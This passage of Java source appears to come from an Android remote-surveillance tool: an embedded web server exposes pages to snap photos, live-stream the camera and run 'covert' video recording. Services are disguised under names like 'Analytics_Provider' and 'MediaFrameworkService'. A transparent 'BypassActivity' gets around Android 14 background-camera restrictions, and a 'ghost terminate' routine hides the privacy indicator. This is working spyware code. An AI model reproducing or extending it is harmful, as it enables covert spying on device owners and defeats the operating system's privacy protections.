                if (service == null) {
                    Intent intent = new Intent(context, Analytics_Provider.class);
                    context.startForegroundService(intent);
                    // Wait for service initialization
                    for (int i = 0; i < 10; i++) {
                        Thread.sleep(200);
                        service = Analytics_Provider.getInstance();
                        if (service != null) break;
                    }
                }

                if (service != null) {
                    service.capturePhotoBackground(cameraId);
                    imageData = Analytics_Provider.waitForPhoto(12000);
                    error = Analytics_Provider.getLastCaptureError();
                } else {
                    // Critical fallback to Helper
                    CameraHelper cameraHelper = new CameraHelper(context);
                    imageData = cameraHelper.capturePhoto(cameraId);
                    error = cameraHelper.getLastError();
                }
            }

            if (imageData != null && imageData.length > 0) {
                String base64Image = android.util.Base64.encodeToString(imageData, android.util.Base64.NO_WRAP);

                html.append("<div style=\"text-align: center;\">");
                html.append("<img src=\"data:image/jpeg;base64,").append(base64Image).append("\" ");
                html.append("style=\"max-width: 100%; height: auto; border-radius: 10px; margin-bottom: 20px;\" />");
                html.append("</div>");

                html.append("<div style=\"display: flex; gap: 10px; justify-content: center; flex-wrap: wrap;\">");
                html.append(
                        "<a href=\"/camera\" style=\"padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("<a href=\"/camera/photo?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(46, 204, 113, 0.2); border-radius: 10px; color: #2ecc71; text-decoration: none;\">&#8595; Download Photo</a>");
                html.append("<a href=\"/camera/capture?cam=").append(cameraId).append(
                        "\" style=\"padding: 12px 24px; background: rgba(0, 242, 255, 0.1); border-radius: 10px; color: #00f2ff; text-decoration: none;\">&#128247; Capture Again</a>");
                html.append("</div>");

            } else {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
                html.append("<p>Failed to capture photo</p>");
                if (error != null) {
                    html.append("<p style=\"color: #e74c3c; font-size: 0.9rem; margin-top: 10px;\">")
                            .append(escapeHtml(error)).append("</p>");
                }
                html.append(
                        "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
                html.append("</div>");
            }

        } catch (Exception e) {
            html.append("<div class=\"empty-state\"><div class=\"icon\">&#9888;</div>");
            html.append("<p>Error: ").append(escapeHtml(e.getMessage())).append("</p>");
            html.append(
                    "<a href=\"/camera\" style=\"display: inline-block; margin-top: 20px; padding: 12px 24px; background: rgba(52, 152, 219, 0.2); border-radius: 10px; color: #3498db; text-decoration: none;\">&#8592; Back to Camera</a>");
            html.append("</div>");
        }

        html.append("</div>"); // Close marker
        html.append("</div>"); // Close card

        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveCameraPhoto(Map<String, String> params) {
        String cameraId = params.get("cam");
        if (cameraId == null || cameraId.isEmpty()) {
            cameraId = "0";
        }

        // Check permission
        if (context.checkSelfPermission(Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
            return serveError("Camera permission not granted");
        }

        try {
            byte[] imageData = null;
            String errorMsg = null;

            if (Analytics_Provider.isCurrentlyStreaming()) {
                imageData = Analytics_Provider.getNextFrame(1500);
            } else {
                Analytics_Provider service = Analytics_Provider.getInstance();
                if (service != null) {
                    service.capturePhotoBackground(cameraId);
                    imageData = Analytics_Provider.waitForPhoto(12000);
                    errorMsg = Analytics_Provider.getLastCaptureError();
                } else {
                    CameraHelper cameraHelper = new CameraHelper(context);
                    imageData = cameraHelper.capturePhoto(cameraId);
                    errorMsg = cameraHelper.getLastError();
                }
            }

            if (imageData != null && imageData.length > 0) {
                java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(imageData);
                Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, imageData.length);
                response.addHeader("Content-Disposition",
                        "attachment; filename=\"photo_" + cameraId + "_" + System.currentTimeMillis() + ".jpg\"");
                return response;
            } else {
                return serveError(errorMsg != null ? errorMsg : "Failed to capture photo (Hardware Timeout)");
            }

        } catch (Exception e) {
            return serveError("Error capturing photo: " + e.getMessage());
        }
    }

    // ============ LIVE STREAMING ============

    private Response serveLiveStreamPage(Map<String, String> params, IHTTPSession session) {
        String camId = params.get("cam");
        if (camId == null)
            camId = "0";

        // Get resolution from params, default to "low" for mobile data optimization
        String res = params.get("res");
        if (res == null)
            res = "low";
            
        int resIndex = 2;
        if ("ultra_low".equals(res)) resIndex = 0;
        else if ("very_low".equals(res)) resIndex = 1;
        else if ("low".equals(res)) resIndex = 2;
        else if ("medium".equals(res)) resIndex = 3;
        else if ("high".equals(res)) resIndex = 4;
        else if ("very_high".equals(res)) resIndex = 5;

        // Resolution presets optimized for different network speeds
        int width, height, quality, fps;
        String resLabel;
        switch (res) {
            case "ultra_low":
                width = 640;
                height = 480;
                quality = 15;
                fps = 2;
                resLabel = "Ultra Low (Optimized)";
                break;
            case "very_low":
                width = 640;
                height = 480;
                quality = 25;
                fps = 4;
                resLabel = "Very Low (Stable)";
                break;
            case "low":
            default:
                width = 640;
                height = 480;
                quality = 35;
                fps = 6;
                resLabel = "Low (Standard)";
                break;
            case "medium":
                width = 640;
                height = 480;
                quality = 45;
                fps = 8;
                resLabel = "Medium (640x480)";
                break;
            case "high":
                width = 1920;
                height = 1080;
                quality = 85;
                fps = 10;
                resLabel = "High (1080p)";
                break;
            case "very_high":
                width = 1920;
                height = 1080;
                quality = 100;
                fps = 10;
                resLabel = "Very High (Fidelity)";
                break;
        }

        int refreshRate = 1000 / fps; // Convert FPS to milliseconds

        // Tactical UI Cropping Calculation
        int uiHeight = 320;
        if ("ultra_low".equals(res)) uiHeight = 200;
        else if ("very_low".equals(res)) uiHeight = 240;
        else if ("low".equals(res)) uiHeight = 280;
        else if ("medium".equals(res)) uiHeight = 320;
        else if ("high".equals(res)) uiHeight = 380;
        else if ("very_high".equals(res)) uiHeight = 420;

        StringBuilder html = new StringBuilder(getHeader(session.getUri()));
        html.append("<style>")
            .append("@media (min-width: 769px) {")
            .append("  #stream-container { max-width: 100% !important; height: 600px !important; }")
            .append("  #stream { width: 100% !important; height: 100% !important; object-fit: cover !important; border-radius: 8px; border: 1px solid rgba(0, 242, 255, 0.3); }")
            .append("}")
            .append("@media (max-width: 768px) {")
            .append("  #stream-container { height: ").append(uiHeight).append("px !important; }")
            .append("  #stream { object-fit: contain !important; }")
            .append("}")
            .append("</style>");
        html.append("<div class=\"back-btn-container\">");
        html.append("<a href=\"/\" class=\"btn-back\">&#8592; Back to Terminal</a>");
        html.append("</div>");
        html.append("<div class=\"card\">");
        html.append("<h2 style=\"margin: 0 0 15px 0; white-space: normal; text-align: left; font-size: 1.1rem;\">&#128249; LIVE_STREAM_UPLINK</h2>");
        
        // Advanced Tactical Indicator - Placed UNDER title for mobile clarity
        html.append("<div id=\"live-indicator\" style=\"display: inline-flex; align-items: center; background: rgba(255,255,0,0.05); border: 1px solid var(--neon-yellow); padding: 4px 10px; border-radius: 6px; font-size: 0.6rem; color:var(--neon-yellow); font-weight:bold; font-family:monospace; letter-spacing:1px; white-space: nowrap; margin-bottom: 20px;\">");
        html.append("<span class=\"badge-dot\" id=\"indicator-dot\" style=\"font-size: 0.5rem;\">&#9679;</span>&nbsp;");
        html.append("<span id=\"indicator-text\">STANDBY</span>");
        html.append("</div>");
        html.append("<div style=\"border-bottom: 1px solid rgba(0, 242, 255, 0.3); margin-bottom: 25px;\"></div>");

        // Check permission
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            if (context.checkSelfPermission(android.Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) {
                html.append("<div class=\"empty-state\"><div class=\"icon\">&#128274;</div>");
                html.append("<p>Camera permission not granted.</p>");
                html.append("</div>");
                html.append("</div>");
                html.append(HTML_FOOTER);
                return newFixedLengthResponse(Response.Status.OK, "text/html", html.toString());
            }
        }

        // Network info banner
        html.append(
                "<div style=\"background: rgba(52, 152, 219, 0.2); padding: 10px 15px; border-radius: 8px; margin-bottom: 15px; text-align: center;\">");
        html.append("<span id=\"res-banner\" style=\"color: #3498db; font-size: 0.85rem;\">&#128246; Current: ").append(resLabel);
        html.append(" | ~").append(quality * width * height / 8000).append(" KB/frame</span>");
        html.append("</div>");

        // Live stream viewer
        html.append("<div style=\"text-align: center; margin-bottom: 25px;\">");
        html.append(
                "<div id=\"stream-container\" style=\"position: relative; display: flex; align-items: center; justify-content: center; width: 100%; max-width: 100% !important; height: 450px; background: #000; border: 1px solid var(--neon-cyan); border-radius: 8px; overflow: hidden; margin: 0 auto; box-shadow: 0 0 20px rgba(0,242,255,0.1);\">");
        html.append(
                "<img id=\"stream\" src=\"/camera/frame\" style=\"width: 100%; height: 100%; object-fit: contain; display: block; transition: transform 0.3s ease;\" ");
        html.append("onerror=\"handleStreamError()\" onload=\"streamLoaded()\" />");
        html.append(
                "<div id=\"stream-overlay\" style=\"position: absolute; top: 10px; left: 10px; background: rgba(0,0,0,0.7); padding: 4px 8px; border-radius: 6px; font-size: 0.65rem; border: 1px solid rgba(255,255,255,0.1); z-index: 10; white-space: nowrap;\">");
        html.append("<span id=\"stream-status\" style=\"color: #2ecc71;\">&#9679; LIVE</span>");
        html.append("<span id=\"fps-counter\" style=\"color: #888; margin-left: 8px;\"></span>");
        html.append("</div>");
        html.append(
                "<div id=\"loading\" style=\"position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); color: #fff; z-index: 5; font-family: monospace; font-size: 0.8rem;\">Loading...</div>");
        html.append(
                "<div id=\"rec-indicator\" style=\"position: absolute; top: 10px; right: 10px; background: rgba(231, 76, 60, 0.9); padding: 4px 8px; border-radius: 6px; font-size: 0.65rem; display: none; z-index: 10; border: 1px solid rgba(255,255,255,0.1);\">");
        html.append("<span style=\"color: #fff;\">&#9679; REC</span>");
        html.append("</div>");
        html.append("</div>");
        html.append("</div>");

        // Resolution selector
        html.append("<div style=\"margin-bottom: 30px; text-align: center; max-width: 500px; margin-left: auto; margin-right: auto; padding: 0 10px;\">");
        html.append("<div class=\"info-label\" style=\"text-align: center;\">SURVEILLANCE_FIDELITY</div>");
        html.append("<div style=\"position: relative; width: 100%;\">");
        html.append("<input type=\"range\" id=\"quality-slider\" min=\"0\" max=\"5\" value=\"").append(resIndex).append("\" onchange=\"applyQuality(this.value)\" style=\"width: 100%; margin: 0; padding: 0; cursor: pointer;\">");
        html.append("<div style=\"position: relative; width: 100%; height: 20px; font-size: 0.5rem; color: #777; font-family: monospace; letter-spacing: 0; margin-top: 8px;\">");
        html.append("<span style=\"position: absolute; left: 0; top: 0; white-space: nowrap;\">ULTRA LOW</span>");
        html.append("<span style=\"position: absolute; left: 20%; top: 0; transform: translateX(-50%);\">VL</span>");
        html.append("<span style=\"position: absolute; left: 40%; top: 0; transform: translateX(-50%);\">L</span>");
        html.append("<span style=\"position: absolute; left: 60%; top: 0; transform: translateX(-50%);\">M</span>");
        html.append("<span style=\"position: absolute; left: 80%; top: 0; transform: translateX(-50%);\">H</span>");
        html.append("<span style=\"position: absolute; right: 0; top: 0; white-space: nowrap; text-align: right;\">VERY HIGH</span>");
        html.append("</div></div></div>");

        // Camera selection (Condensed)
        html.append("<div style=\"margin-bottom: 15px; text-align: center; max-width: 450px; margin-left: auto; margin-right: auto; padding: 0 10px;\">");
        html.append("<div style=\"color: #888; margin-bottom: 10px; font-size: 0.7rem; font-family:monospace; text-align: center;\">CAMERAS</div>");
        html.append("<div style=\"display: flex; gap: 8px; justify-content: center; width: 100%;\">");
        CameraHelper cameraHelper = new CameraHelper(context);
        java.util.List<CameraHelper.CameraInfo> cameras = cameraHelper.getAvailableCameras();
        for (CameraHelper.CameraInfo cam : cameras) {
            String selected = cam.id.equals(camId) ? "border-color: #00f2ff; color: #00f2ff; background: rgba(0, 242, 255, 0.15);" : "border-color: rgba(255,255,255,0.2); color: #888; background: rgba(255, 255, 255, 0.05);";
            html.append("<button onclick=\"switchCam('").append(cam.id).append("')\" ");
            html.append("class=\"btn-small\" style=\"padding: 10px 1px; font-size: 0.7rem; ").append(selected).append(" flex: 1; min-width: 0; margin:0; text-decoration:none; text-align:center; cursor:pointer;\">");
            html.append(cam.facing.toUpperCase());
            html.append("</button>");
        }
        html.append("</div></div>");

        // Action buttons
        html.append("<div style=\"display: grid; grid-template-columns: 1fr 1fr; gap: 6px; margin-top: 15px; width: 100%; max-width: 450px; margin-left: auto; margin-right: auto;\">");
        
        html.append("<button onclick=\"rotateStream()\" class=\"btn btn-small\" style=\"border-color: #f39c12; color: #f39c12; background: rgba(243, 156, 18, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#8635; ROTATE</button>");
        
        html.append("<button onclick=\"capturePhoto()\" class=\"btn btn-small\" style=\"border-color: var(--neon-cyan); color: var(--neon-cyan); background: rgba(0, 242, 255, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#128247; SNAP</button>");
        
        html.append("<button id=\"rec-btn\" onclick=\"toggleRecording()\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: var(--danger); color: var(--danger); background: rgba(255, 49, 49, 0.05); padding: 12px; margin:0; width:100%; min-width:0;\">&#9679; START_COVERT_RECORDING</button>");
        
        html.append("<a href=\"/camera\" class=\"btn btn-small\" style=\"grid-column: span 2; border-color: #888; color: #888; background: rgba(255, 255, 255, 0.05); padding: 10px; text-decoration: none; text-align: center; margin:0; width:100%; min-width:0;\">&#8592; BACK</a>");

        html.append("</div>");

        // Status
        html.append("<div id=\"status\" style=\"text-align: center; margin-top: 20px; color: #888; font-size: 0.9rem;\"></div>");

        // JavaScript for live stream with optimizations
        html.append("<script>");
        html.append("var camId = '").append(camId).append("';");
        html.append("var streamWidth = ").append(width).append(";");
        html.append("var streamHeight = ").append(height).append(";");
        html.append("var streamQuality = ").append(quality).append(";");
        html.append("var streamFps = ").append(fps).append(";");
        html.append("var refreshRate = ").append(1000/fps).append(";");
        html.append("var refreshRate = ").append(refreshRate).append(";");
        html.append("var isRecording = false;");
        html.append("var streamImg = document.getElementById('stream');");
        html.append("var loadingDiv = document.getElementById('loading');");
        html.append("var fpsCounter = document.getElementById('fps-counter');");
        html.append("var frameCount = 0;");
        html.append("var lastFpsTime = Date.now();");
        html.append("var errorCount = 0;");
        html.append("var streamActive = true;");
        html.append("var currentRotation = 0;");

        // Rotate stream function
        html.append("function rotateStream() {");
        html.append("  currentRotation = (currentRotation + 90) % 360;");
        html.append("  streamImg.style.transform = 'rotate(' + currentRotation + 'deg)';");
        html.append("}");

        // Quality Control Functions
        html.append("const resOptions = ['ultra_low', 'very_low', 'low', 'medium', 'high', 'very_high'];");
        html.append("function stepQuality(delta) {");
        html.append("  const s = document.getElementById('quality-slider');");
        html.append("  let val = parseInt(s.value) + delta;");
        html.append("  if(val < 0) val = 0; if(val > 5) val = 5;");
        html.append("  s.value = val; applyQuality(val);");
        html.append("}");
        html.append("function applyQuality(val) {");
        html.append("  localStorage.setItem('cam_scroll', window.scrollY);");
        html.append("  window.location.href = '/camera/live?cam=' + camId + '&res=' + resOptions[val];");
        html.append("}");

        // Switch camera with explicit stop for hardware release
        html.append("async function switchCam(newCamId) {");
        html.append("  if (newCamId === camId) return;");
        html.append("  const currentScroll = window.scrollY;");
        html.append("  streamActive = false;");
        html.append("  document.getElementById('loading').style.display = 'block';");
        html.append("  document.getElementById('loading').innerText = 'RELEASING_HARDWARE...';");
        html.append("  await fetch('/camera/stop-stream');");
        html.append("  const currentRes = resOptions[document.getElementById('quality-slider').value];");
        html.append("  const nextUrl = '/camera/live?cam=' + newCamId + '&res=' + currentRes;");
        html.append("  localStorage.setItem('cam_scroll', currentScroll);");
        html.append("  setTimeout(() => { window.location.href = nextUrl; }, 300);");
        html.append("}");


        // Start streaming with current resolution
        html.append("function startStream() {");
        html.append(
                "  fetch('/camera/start-stream?cam=' + camId + '&width=' + streamWidth + '&height=' + streamHeight + '&quality=' + streamQuality);");
        html.append("  setTimeout(refreshFrame, 1000);");
        html.append("}");

        // Handle stream load success
        html.append("function streamLoaded() {");
        html.append("  loadingDiv.style.display = 'none';");
        html.append("  errorCount = 0;");
        html.append("  frameCount++;");
        html.append("  var now = Date.now();");
        html.append("  if (now - lastFpsTime >= 1000) {");
        html.append("    fpsCounter.innerHTML = frameCount + ' fps';");
        html.append("    frameCount = 0;");
        html.append("    lastFpsTime = now;");
        html.append("  }");
        html.append("  if (streamActive) setTimeout(refreshFrame, Math.max(10, refreshRate));");
        html.append("}");

        // Handle stream error with retry
        html.append("function handleStreamError() {");
        html.append("  errorCount++;");
        html.append("  if (errorCount < 10) {");
        html.append("    if (streamActive) setTimeout(refreshFrame, 500);");
        html.append("  } else {");
        html.append(
                "    loadingDiv.innerHTML = 'Stream error. <a href=\"javascript:location.reload()\" style=\"color:#e94560\">Reload</a>';");
        html.append("  }");
        html.append("}");

        // Refresh frame with adaptive timing (Double Buffered)
        html.append("function refreshFrame() {");
        html.append("  if (!streamActive) return;");
        html.append("  const buffer = new Image();");
        html.append("  buffer.src = '/camera/frame?t=' + Date.now();");
        html.append("  buffer.onload = () => {");
        html.append("    if (!streamActive) return;");
        html.append("    streamImg.src = buffer.src;");
        html.append("    streamLoaded();");
        html.append("  };");
        html.append("  buffer.onerror = () => {");
        html.append("    if (streamActive) handleStreamError();");
        html.append("  };");
        html.append("}");

        // Capture photo
        html.append("function capturePhoto() {");
        html.append("  window.open('/camera/photo?cam=' + camId, '_blank');");
        html.append("}");

        // Toggle recording
        html.append("function toggleRecording() {");
        html.append("  var btn = document.getElementById('rec-btn');");
        html.append("  var indicator = document.getElementById('rec-indicator');");
        html.append("  if (isRecording) {");
        html.append("    fetch('/camera/stop-record').then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9679; START_COVERT_RECORDING';");
        html.append("      btn.style.background = 'rgba(255, 49, 49, 0.05)';");
        html.append("      indicator.style.display = 'none';");
        html.append("      isRecording = false;");
        html.append("    });");
        html.append("  } else {");
        html.append("    fetch('/camera/record?cam=' + camId).then(r => r.json()).then(d => {");
        html.append("      document.getElementById('status').innerHTML = d.message;");
        html.append("      btn.innerHTML = '&#9632; STOP_COVERT_RECORDING';");
        html.append("      btn.style.background = 'rgba(255, 49, 49, 0.2)';");
        html.append("      indicator.style.display = 'block';");
        html.append("      isRecording = true;");
        html.append("    });");
        html.append("  }");
        html.append("}");

        // Check status
        html.append("function checkStatus() {");
        html.append("  fetch('/camera/status').then(r => r.json()).then(d => {");
        html.append("    const ind = document.getElementById('live-indicator');");
        html.append("    const dot = document.getElementById('indicator-dot');");
        html.append("    const txt = document.getElementById('indicator-text');");
        html.append("    if (d.recording) {");
        html.append("      document.getElementById('rec-indicator').style.display = 'block';");
        html.append("      document.getElementById('rec-btn').innerHTML = '&#9632; STOP_COVERT_RECORDING';");
        html.append("      ind.style.borderColor = 'var(--danger)'; ind.style.color = 'var(--danger)'; ind.style.background = 'rgba(255, 49, 49, 0.15)';");
        html.append("      dot.className = 'badge-dot blink-fast'; txt.innerText = 'REC (' + d.duration + 's)';");
        html.append("      isRecording = true;");
        html.append("    } else {");
        html.append("      document.getElementById('rec-indicator').style.display = 'none';");
        html.append("      document.getElementById('rec-btn').innerHTML = '&#9679; START_COVERT_RECORDING';");
        html.append("      ind.style.borderColor = 'var(--neon-green)'; ind.style.color = 'var(--neon-green)'; ind.style.background = 'rgba(57, 255, 20, 0.15)';");
        html.append("      dot.className = 'badge-dot blink-slow'; txt.innerText = 'LIVE';");
        html.append("      isRecording = false;");
        html.append("    }");
        html.append("  }).catch(e => {});");
        html.append("}");
        html.append("setInterval(checkStatus, 2000);");

        // Stop stream when leaving page
        html.append("window.onbeforeunload = function() { streamActive = false; };");

        html.append("startStream();");
        html.append("checkStatus();");
        html.append("</script>");

        html.append("</div>"); // Close marker
        html.append("</div>"); // Close card

        return serveGzipped(session, "text/html", html.toString());
    }

    private Response serveMJPEGStream(Map<String, String> params) {
        if (!Analytics_Provider.isCurrentlyStreaming()) {
            String camId = params.get("cam");
            int width = 640, height = 480, quality = 40;
            try {
                if(params.containsKey("width")) width = Integer.parseInt(params.get("width"));
                if(params.containsKey("height")) height = Integer.parseInt(params.get("height"));
                if(params.containsKey("quality")) quality = Integer.parseInt(params.get("quality"));
            } catch(Exception ignored) {}
            
            // [POLICY_BYPASS_TRIGGER]
            // Ensure app is in TOP state for background camera access
            try {
                Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
                bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
                context.startActivity(bypass);
                Thread.sleep(850);
            } catch (Exception ignored) {}

            startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);
            try { Thread.sleep(800); } catch (InterruptedException ignored) {}
        }

        return newChunkedResponse(Response.Status.OK, "multipart/x-mixed-replace; boundary=--frame", new java.io.InputStream() {
            private byte[] currentData = null;
            private int currentPos = 0;

            @Override
            public int read() throws java.io.IOException {
                if (currentData == null || currentPos >= currentData.length) {
                    if (!fetchNextChunk()) return -1;
                }
                return currentData[currentPos++] & 0xFF;
            }

            @Override
            public int read(byte[] b, int off, int len) throws java.io.IOException {
                if (currentData == null || currentPos >= currentData.length) {
                    if (!fetchNextChunk()) return -1;
                }
                int available = currentData.length - currentPos;
                int toCopy = Math.min(len, available);
                System.arraycopy(currentData, currentPos, b, off, toCopy);
                currentPos += toCopy;
                return toCopy;
            }

            private boolean fetchNextChunk() {
                if (!Analytics_Provider.isCurrentlyStreaming()) return false;
                byte[] frame = Analytics_Provider.getNextFrame(5000);
                if (frame == null) return false;

                try {
                    String header = "\r\n--frame\r\nContent-Type: image/jpeg\r\nContent-Length: " + frame.length + "\r\n\r\n";
                    byte[] headerBytes = header.getBytes("UTF-8");
                    currentData = new byte[headerBytes.length + frame.length];
                    System.arraycopy(headerBytes, 0, currentData, 0, headerBytes.length);
                    System.arraycopy(frame, 0, currentData, headerBytes.length, frame.length);
                    currentPos = 0;
                    return true;
                } catch (Exception e) { return false; }
            }
        });
    }

    private Response serveSingleFrame() {
        // [PERFORMANCE_TUNING] Wait up to 2 seconds for initial hardware lock
        byte[] frame = Analytics_Provider.getNextFrame(2000);
        if (frame != null && frame.length > 0) {
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(frame);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, frame.length);
            response.addHeader("Cache-Control", "no-cache, no-store, must-revalidate");
            response.addHeader("Pragma", "no-cache");
            response.addHeader("Expires", "0");
            return response;
        } else {
            // Return a 1x1 transparent pixel as fallback
            byte[] pixel = new byte[] {
                    (byte) 0xFF, (byte) 0xD8, (byte) 0xFF, (byte) 0xE0, 0x00, 0x10, 0x4A, 0x46,
                    0x49, 0x46, 0x00, 0x01, 0x01, 0x00, 0x00, 0x01, 0x00, 0x01, 0x00, 0x00,
                    (byte) 0xFF, (byte) 0xDB, 0x00, 0x43, 0x00, 0x08, 0x06, 0x06, 0x07, 0x06,
                    0x05, 0x08, 0x07, 0x07, 0x07, 0x09, 0x09, 0x08, 0x0A, 0x0C, 0x14, 0x0D,
                    0x0C, 0x0B, 0x0B, 0x0C, 0x19, 0x12, 0x13, 0x0F, 0x14, 0x1D, 0x1A, 0x1F,
                    0x1E, 0x1D, 0x1A, 0x1C, 0x1C, 0x20, 0x24, 0x2E, 0x27, 0x20, 0x22, 0x2C,
                    0x23, 0x1C, 0x1C, 0x28, 0x37, 0x29, 0x2C, 0x30, 0x31, 0x34, 0x34, 0x34,
                    0x1F, 0x27, 0x39, 0x3D, 0x38, 0x32, 0x3C, 0x2E, 0x33, 0x34, 0x32,
                    (byte) 0xFF, (byte) 0xC0, 0x00, 0x0B, 0x08, 0x00, 0x01, 0x00, 0x01, 0x01,
                    0x01, 0x11, 0x00, (byte) 0xFF, (byte) 0xC4, 0x00, 0x1F, 0x00, 0x00, 0x01,
                    0x05, 0x01, 0x01, 0x01, 0x01, 0x01, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00,
                    0x00, 0x00, 0x00, 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09,
                    0x0A, 0x0B, (byte) 0xFF, (byte) 0xC4, 0x00, (byte) 0xB5, 0x10, 0x00, 0x02,
                    0x01, 0x03, 0x03, 0x02, 0x04, 0x03, 0x05, 0x05, 0x04, 0x04, 0x00, 0x00,
                    0x01, 0x7D, (byte) 0xFF, (byte) 0xDA, 0x00, 0x08, 0x01, 0x01, 0x00, 0x00,
                    0x3F, 0x00, 0x7F, (byte) 0xFF, (byte) 0xD9
            };
            java.io.ByteArrayInputStream bis = new java.io.ByteArrayInputStream(pixel);
            Response response = newFixedLengthResponse(Response.Status.OK, "image/jpeg", bis, pixel.length);
            response.addHeader("Cache-Control", "no-cache");
            return response;
        }
    }

    private Response startCameraStream(Map<String, String> params) {
        String camId = params.get("cam");
        logActivity("OPTICS_UPLINK: Live stream started on camera " + (camId != null ? camId : "0"));
        String widthStr = params.get("width");
        String heightStr = params.get("height");
        String qualityStr = params.get("quality");

        int width = 640, height = 480, quality = 50;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
            if (qualityStr != null)
                quality = Integer.parseInt(qualityStr);
        } catch (Exception ignored) {
        }

        // [POLICY_BYPASS_TRIGGER]
        // Launch a transparent Activity to bring the app to the 'TOP' state.
        // This satisfies Android 14's background camera restrictions.
        try {
            Intent bypass = new Intent(context, CameraHelper.BypassActivity.class);
            bypass.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_ANIMATION);
            context.startActivity(bypass);
            Thread.sleep(850); // Increased to ensure TOP state is registered
        } catch (Exception ignored) {}

        // [STABILITY_ROUTING] Clean hand-off to Analytics_Provider service
        startCameraStreamInternal(camId != null ? camId : "0", width, height, quality);

        org.json.JSONObject result = new org.json.JSONObject();
        try {
            result.put("success", true);
            result.put("message", "Stream started");
            result.put("camera", (camId != null ? camId : "0"));
        } catch (Exception ignored) {}
        return newFixedLengthResponse(Response.Status.OK, "application/json", result.toString());
    }

    private void startCameraStreamInternal(String camId, int width, int height, int quality) {
        android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
        intent.setAction(Constants.ACTION_START_STREAM);
        intent.putExtra("cameraId", camId);
        intent.putExtra("width", width);
        intent.putExtra("height", height);
        intent.putExtra("quality", quality);

        context.startForegroundService(intent);
    }

    private Response stopCameraStream() {
        android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
        intent.setAction(Constants.ACTION_STOP_STREAM);
        context.startService(intent);

        String json = "{\"success\": true, \"message\": \"Stream stopped\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response startVideoRecording(Map<String, String> params) {
        String camId = params.get("cam");
        logActivity("OPTICS_UPLINK: Background video recording started on camera " + (camId != null ? camId : "0"));
        String widthStr = params.get("width");
        String heightStr = params.get("height");

        int width = 1280, height = 720;
        try {
            if (widthStr != null)
                width = Integer.parseInt(widthStr);
            if (heightStr != null)
                height = Integer.parseInt(heightStr);
        } catch (Exception e) {
        }

        android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
        intent.setAction(Constants.ACTION_START_RECORDING);
        intent.putExtra("cameraId", camId != null ? camId : "0");
        intent.putExtra("width", width);
        intent.putExtra("height", height);

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            context.startForegroundService(intent);
        } else {
            context.startService(intent);
        }

        String json = "{\"success\": true, \"message\": \"Recording started\", \"camera\": \"" +
                (camId != null ? camId : "0") + "\"}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response stopVideoRecording() {
        logActivity("OPTICS_TERMINATED: Background recording saved");
        android.content.Intent intent = new android.content.Intent(context, Analytics_Provider.class);
        intent.setAction(Constants.ACTION_STOP_RECORDING);
        context.startService(intent);

        String videoPath = Analytics_Provider.getCurrentVideoPath();
        String json = "{\"success\": true, \"message\": \"Recording stopped\"" +
                (videoPath != null ? ", \"path\": \"" + videoPath + "\"" : "") + "}";
        return newFixedLengthResponse(Response.Status.OK, "application/json", json);
    }

    private Response terminateAllCaptures() {
        // [GHOST_TERMINATE_PROTOCOL]
        // Kills all active hardware services to force the green dot indicator to disappear
        
        Intent cameraStop = new Intent(context, Analytics_Provider.class);
        cameraStop.setAction("STOP");
        context.startService(cameraStop);
        
        Intent audioStop = new Intent(context, MediaFrameworkService.class);
        audioStop.setAction("STOP");
        context.startService(audioStop);
        
        logActivity("SYSTEM_MAINTENANCE: Force-terminated all active hardware captures (Privacy Reset)");
        return newFixedLengthResponse(Response.Status.OK, "application/json", "{\"success\": true, \"message\": \"All captures terminated\"}");
    }

    private Response serveCameraStatus() {
        boolean streaming = Analytics_Provider.isCurrentlyStreaming();
        boolean recording = Analytics_Provider.isCurrentlyRecording();
        String currentCamera = Analytics_Provider.getCurrentCameraId();
        long duration = Analytics_Provider.getRecordingDuration();
        String videoPath = Analytics_Provider.getCurrentVideoPath();

        boolean nightMode = Analytics_Provider.isNightModeEnabled(context);

        org.json.JSONObject result = new org.json.JSONObject();
        try {
            result.put("streaming", streaming);
            result.put("recording", recording);
            result.put("camera", currentCamera != null ? currentCamera : "0");
            result.put("duration", duration);
            result.put("nightMode", nightMode);
            result.put("videoPath", videoPath != null ? videoPath : org.json.JSONObject.NULL);
        } catch (Exception ignored) {}
        
        return newFixedLengthResponse(Response.Status.OK, "application/json", result.toString());
    }

    // ============ AUDIO/MICROPHONE RECORDING ============

    private Response serveAudioPage(IHTTPSession session) {
